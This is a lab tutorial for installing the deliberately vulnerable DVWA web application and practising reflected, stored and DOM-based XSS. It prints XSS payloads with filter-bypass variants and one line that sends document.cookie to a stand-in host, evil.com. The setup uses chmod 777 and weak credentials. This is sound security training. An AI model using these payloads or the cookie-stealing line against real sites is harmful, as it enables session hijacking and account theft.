# ğŸš© **Practical: DVWA â€“ XSS Testing Lab**

## ğŸ“Œ **What is DVWA?**

> DVWA is a deliberately vulnerable PHP/MySQL web app for practicing web security attacks like **SQL Injection**, **XSS**, **Command Injection**, **File Inclusion**, etc., in a **legal, safe, isolated environment**.

---

## ğŸ”¹ **STEP 1 â€” Install Dependencies**

Run as **root**:

```bash
sudo -s
apt update
apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php git
```

---

## ğŸ”¹ **STEP 2 â€” Download DVWA**

Move to Apacheâ€™s web root:

```bash
cd /var/www/html/
git clone https://github.com/digininja/DVWA.git
```

---

## ğŸ”¹ **STEP 3 â€” Configure DVWA**

Go inside the DVWA folder:

```bash
cd /var/www/html/DVWA
cp config/config.inc.php.dist config/config.inc.php
nano config/config.inc.php
```

Edit the **database settings**:

```php
$_DVWA[ 'db_server' ] = '127.0.0.1';
$_DVWA[ 'db_port' ] = '3306';
$_DVWA[ 'db_user' ] = 'admin';
$_DVWA[ 'db_password' ] = 'admin@123';
$_DVWA[ 'db_database' ] = 'dvwa';
```

âœ”ï¸ **Save & exit:** `Ctrl+O`, `Enter`, `Ctrl+X`.

---

## ğŸ”¹ **STEP 4 â€” Configure Database**

Restart MariaDB:

```bash
systemctl restart mariadb.service
```

Enter MariaDB shell:

```bash
mariadb -u root
```

Inside **MariaDB prompt**:

```sql
CREATE DATABASE dvwa;
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin@123';
GRANT ALL PRIVILEGES ON dvwa.* TO 'admin'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

---

## ğŸ”¹ **STEP 5 â€” Fix Permissions**

```bash
chmod -R 777 /var/www/html/DVWA
systemctl restart mariadb.service
systemctl restart apache2.service
```

---

## ğŸ”¹ **STEP 6 â€” Setup DVWA in Browser**

1. Open:

   ```
   http://localhost/DVWA/index.php
   ```

2. **Login:**

   - Username: `admin`
   - Password: `password`

3. Scroll to the bottom â†’ Click **Create / Reset Database**.

4. Re-login â†’ DVWA Dashboard is now active!

---

## âœ… **DVWA IS READY!**

---

## ğŸ”¹ **STEP 7 â€” XSS PRACTICAL TASKS**

---

## ğŸ”¸ 1ï¸âƒ£ **Reflected XSS**

> **Reflected XSS**: User input is reflected back immediately in the response.
> âœ… Not stored server-side.

**Path:**

```
DVWA â†’ Vulnerabilities â†’ XSS (Reflected)
```

- **Low Security:**

  - Enter: `Hello` â†’ Output: `Hello`
  - Try: `<script>alert("hello")</script>` â†’ Pops up alert.
  - Try: `<script>alert(document.cookie)</script>` â†’ Pops cookie.

- **Medium Security:**

  - Basic `<script>` is blocked. Try bypass:

    ```html
    <scr<script>ipt>alert(1)</script>
    ```

  - Or:

    ```html
    <scr<script>ipt>alert(document.cookie)</script>
    ```

- **High Security:**

  - `<script>` blocked â†’ try:

    ```html
    <img src=x onmouseover=alert("hello")>
    ```

  - Hover over broken image â†’ alert fires.

---

## ğŸ”¸ 2ï¸âƒ£ **Stored XSS**

> **Stored XSS:** Payload is **saved** to the DB, **triggers every time** page loads.

**Path:**

```
DVWA â†’ Vulnerabilities â†’ XSS (Stored)
```

- Type: `<script>alert(1)</script>` â†’ Submit.
- Every time page loads, script runs.

âœ… Tip: Some fields have **maxlength** â€” inspect with DevTools â†’ increase to `100` â†’ inject larger payload.

---

## ğŸ”¸ 3ï¸âƒ£ **DOM-Based XSS**

> **DOM XSS:** Exploits client-side JavaScript. Payload in **URL**, parsed in browser.

**Path:**

```
DVWA â†’ Vulnerabilities â†’ XSS (DOM)
```

- Select language â†’ Look at URL:

  ```
  http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English
  ```

- Replace `English` with:

  ```html
  <script>
    alert(1);
  </script>
  ```

- Press `Enter` â†’ The pageâ€™s JavaScript runs it â†’ alert pops.

---

## âœ… **DVWA Security Level**

- To switch security level:

  - `DVWA Security` â†’ set to **Low**, **Medium**, **High**.
  - Retest XSS payloads.

---

## ğŸ”¹ **EXTRA PRACTICALS**

âœ”ï¸ Try **XSS filter evasion**:

```html
<svg/onload=alert(1)>
```

âœ”ï¸ Test **encoded payloads**:

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

âœ”ï¸ Observe **Referrer & Cookies**:

```html
<script>
  fetch("http://evil.com/" + document.cookie);
</script>
```

_(Lab only!)_

---

## âœ… **DVWA XSS: Final Quick Checklist**

```
1ï¸âƒ£ Install Apache, MariaDB, PHP
2ï¸âƒ£ Clone DVWA â†’ configure DB
3ï¸âƒ£ Create DB, user, permissions
4ï¸âƒ£ Fix permissions â†’ Restart services
5ï¸âƒ£ Open DVWA in browser â†’ Login â†’ Create DB
6ï¸âƒ£ Practice Reflected, Stored, DOM XSS
7ï¸âƒ£ Switch security levels â†’ Try filter bypass
```

---
